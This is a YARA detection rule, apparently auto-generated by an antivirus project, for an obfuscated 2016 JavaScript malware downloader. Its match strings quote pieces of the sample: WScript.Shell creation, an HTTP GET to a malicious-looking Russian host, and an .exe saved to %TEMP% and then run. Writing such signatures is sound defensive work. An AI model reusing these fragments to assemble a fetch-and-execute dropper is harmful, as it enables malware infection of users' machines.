rule sig_20160330_f926dc2b295bcba50f3c75a95c27e593 {
  meta:
    description = "datamaliciousorder - file 20160330_f926dc2b295bcba50f3c75a95c27e593.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "370996247508e0bf75b67cb8ef82f04e6f3048a3b2bdb493a18059e09c741aca"

  strings:
    $s1  = "var _MR = function _FC() {return WScript[_DA](\"WScript\"+\".Shell\");}(), _YM = 11;" fullword ascii
    $s2  = "function _R0(_S, _PX){_AO = _AO * 1; return _S - _PX;};" fullword ascii
    $s3  = "_AO0[_IA](\"GET\", \"http://ru-optovik.ru/j9ssl\", false);" fullword ascii
    $s4  = "if (_AO0[\"readystate\"] < 2 * 2) continue;" fullword ascii
    $s5  = "function _Y(){return _EY + \"\";};" fullword ascii
    $s6  = "function _PE() {return _MR[\"ExpandEnvironmentStrings\"](\"%TE\"+\"MP%/\") + \"msxRN8QdODdHh3F.ex\" + \"e\";};" fullword ascii
    $s7  = "function _K() {return ((_QJ == true) && (_QJ == _CX)) ? 1 : _AO;};" fullword ascii
    $s8  = "function _EE(_CE){_MR[\"Run\"](_CE, _AO, _AO);};" fullword ascii
    $s9  = "function _B()" fullword ascii
    $s10 = "function _R(){return 22;};" fullword ascii
    $s11 = "return _R0(_Q0, _J0);" fullword ascii
    $s12 = "function _E(_Z) {var _XH = (1, 2, 3, 4, 5, _Z); return _XH;};" fullword ascii
    $s13 = "function _EG(){return _DA;};" fullword ascii
    $s14 = " while (_JN){" fullword ascii
    $s15 = "var _FP = new this[\"Date\"]();" fullword ascii
    $s16 = "var _QJ = false;" fullword ascii
    $s17 = "_CX = true; " fullword ascii
    $s18 = "var _CX = false;" fullword ascii
    $s19 = "var _P = false;" fullword ascii
    $s20 = "_QJ = true; " fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}